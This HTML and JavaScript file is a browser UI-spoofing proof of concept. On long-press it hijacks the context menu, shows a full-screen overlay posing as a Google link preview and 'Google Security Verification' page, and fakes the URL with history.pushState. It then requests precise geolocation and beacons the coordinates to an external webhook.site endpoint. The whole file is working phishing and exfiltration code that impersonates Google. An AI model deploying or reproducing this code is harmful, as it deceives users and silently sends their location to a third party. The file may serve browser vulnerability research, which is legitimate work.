<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Fake Preview Overlay PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui, Roboto, sans-serif;
  background: #f5f5f7;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
}
.spoof-link {
  display: inline-block;
  font-size: 16px;
  padding: 14px 24px;
  border-radius: 12px;
  text-decoration: none;
  background: #1a73e8;
  color: #fff;
  font-weight: 600;
  box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
}

/* 🔥 Lapisan Fake Preview Overlay yang menimpa layar */
#fakePreviewOverlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: #ffffff;
  z-index: 999999;
  flex-direction: column;
  box-sizing: border-box;
  animation: slideUp 0.25s ease-out;
}

@keyframes slideUp {
  from { transform: translateY(100%); }
  to { transform: translateY(0); }
}

.preview-header {
  display: flex;
  align-items: center;
  padding: 12px 16px;
  background: #f1f3f4;
  border-bottom: 1px solid #dadce0;
  font-size: 14px;
  color: #3c4043;
}
.preview-header span {
  margin-left: 10px;
  font-weight: 500;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.preview-body {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 24px;
  text-align: center;
}
button.action-btn {
  font-size: 15px;
  padding: 12px 20px;
  border-radius: 8px;
  border: none;
  background: #1a73e8;
  color: #fff;
  font-weight: 600;
  cursor: pointer;
  margin-top: 16px;
  width: 100%;
  max-width: 280px;
}
.notice {
  margin-top: 14px;
  font-size: 12px;
  color: #5f6368;
}
</style>
</head>

<body>

<!-- Target Link -->
<a href="https://google.com" class="spoof-link" id="triggerLink">Long Press -> Fake Preview Overlay</a>

<!-- 🔥 Elemen Fake Preview yang menimpa tampilan asli -->
<div id="fakePreviewOverlay">
  <div class="preview-header">
    <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#5f6368" d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
    <span id="previewUrlText">https://google.com</span>
  </div>
  <div class="preview-body">
    <h2>Google Security Verification</h2>
    <p>Tap below to authorize session & capture location context.</p>
    
    <button class="action-btn" onclick="getLocation()">Verify & Proceed</button>
    <p id="output" style="margin-top: 16px; font-size: 14px; color: #202124;">Status: Waiting...</p>

    <div class="notice">
      Secure preview environment active.
    </div>
  </div>
</div>

<script>
const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";

function logEvent(type, extra = {}) {
  const data = {
    type,
    ts: performance.now().toFixed(3),
    epoch: Date.now(),
    url: location.href,
    origin: location.origin,
    ...extra
  };
  const params = new URLSearchParams(data).toString();
  new Image().src = `${LOG_ENDPOINT}?${params}`;
}

const triggerLink = document.getElementById('triggerLink');
const fakePreviewOverlay = document.getElementById('fakePreviewOverlay');
const output = document.getElementById('output');

function getLocation() {
  if (!navigator.geolocation) return;
  logEvent("geolocation_requested");

  navigator.geolocation.getCurrentPosition(
    pos => {
      logEvent("geolocation_success", {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      });
      output.textContent = `Captured: ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
    },
    err => {
      logEvent("geolocation_error", { code: err.code });
      output.textContent = 'Permission denied';
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

/* Begitu gestur long-press / contextmenu terdeteksi, timpa layar dengan fake preview */
triggerLink.addEventListener('contextmenu', (e) => {
  e.preventDefault(); // Mencegah menu konteks asli / bawaan browser muncul sepenuhnya
  logEvent("fake_preview_triggered");

  // Memanipulasi history state agar URL tampak sesuai tujuan
  try {
    history.pushState({ previewActive: true }, '', '/preview/google.com');
  } catch (err) {}

  // Menampilkan lapisan fake preview overlay secara instan
  fakePreviewOverlay.style.display = 'flex';
});

triggerLink.addEventListener('touchstart', () => {}, { passive: true });
</script>

</body>
</html>
